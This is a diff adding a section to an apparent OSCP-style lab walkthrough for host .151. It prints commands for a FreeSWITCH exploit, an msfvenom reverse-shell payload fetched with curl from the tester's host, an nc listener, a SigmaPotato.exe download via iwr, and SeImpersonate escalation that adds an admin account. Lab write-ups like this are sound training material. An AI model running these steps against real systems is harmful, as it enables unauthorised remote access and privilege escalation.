@@ -264,3 +264,90 @@ Assuming all went well, we should now be able to simply ssh in as `root`.
 <img src="images/150-root.png" style="border: 2px solid white"><br>
 
 Well done! Enjoy your 20 points.
+
+
+
+<br><br>
+<div id=151></div>
+
+## .151
+
+According to autorecon we've got 3 ports open on this box:
+
+<img src="images/151-auto.png" style="border: 2px solid white"><br>
+
+80 and 3389 are unremarkable from the jump, let's take a look at 8021 (btw the IPs are different, I work slowly):
+
+<img src="images/151-nmap.png" style="border: 2px solid white"><br>
+
+FreeSWITCH. Cool. A quick Google made insanely light work of that:
+
+<img src="images/151-google.png" style="border: 2px solid white"><br>
+
+I ended up using <a href="https://www.exploit-db.com/exploits/47799">this exploitdb code</a> and threw it into a python file. I swear to god it was also the first thing I tried and I was shocked that it worked:
+
+<img src="images/151-test.png" style="border: 2px solid white"><br>
+
+But what DID end up taking a lot of trial and error was how to get a shell here. For some reason I struggled to figure it out but at the end of the day, we need to create a shell payload, get it onto the box and execute it.
+
+Let's start with generating the shell for a Windows machine (because 3389 and 80 told us this was a Win machine):
+
+```msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.223 LPORT=4444 -f hta-psh -o shell.hta```
+
+And then we need to get it on the box:
+
+```python3 test.py 192.168.208.151 "curl -o shell.hta 192.168.45.223/shell.hta"```
+
+<img src="images/151-curl.png" style="border: 2px solid white"><br>
+
+`ERR no reply`. Okay... let's sense check that by typing out the file:
+
+<img src="images/151-type.png" style="border: 2px solid white"><br>
+
+With the file on the box, let's start a listener and run it:
+
+```nc -lvnp 4444```
+
+```python3 test.py 192.168.208.151 "shell.hta"```
+
+The API responded with `ERR no reply` again but we caught the shell!
+
+<img src="images/151-caught.png" style="border: 2px solid white"><br>
+
+Sitting in the `chris` users Desktop folder is the `local.txt` file:
+
+<img src="images/151-local.png" style="border: 2px solid white"><br>
+
+Okay we've got initial access - let's talk priv esc.
+
+If I know one thing about OSCP Windows Priv esc, it's `whoami /priv`
+
+<img src="images/151-whoami.png" style="border: 2px solid white"><br>
+
+And we have `SeImpersonatePrivileges`. You know what to do... in powershell...
+
+```iwr -uri http://192.168.45.223/SigmaPotato.exe -Outfile SigmaPotato.exe```
+
+```.\SigmaPotato "net user notanaccountant password /add"```
+
+```.\SigmaPotato "net localgroup Administrators notanaccountant /add"```
+
+And then we can:
+
+```net user```
+
+<img src="images/151-netuser.png" style="border: 2px solid white"><br>
+
+Now at this point I'll admit I spent about 2 hours half-focusing and half watching Dept.Q on Netflix (highly recommend that it was good). I tried a bunch of different methods here because I didn't realise local admins have RDP default access, runas wasn't working, etc.
+
+This was as simple as RDPing into my Kali VM and then RDPing into the victim machine to get my shell up:
+
+```xfreerdp3 /u:notanaccountant /p:password /v:192.168.208.151```
+
+<img src="images/151-rdp.png" style="border: 2px solid white"><br>
+
+From here we can just right click cmd.exe and run that as an elevated shell. From there, cd to the Administrators desktop and:
+
+<img src="images/151-proof.png" style="border: 2px solid white"><br>
+
+Congratulations, that's all the standalones!
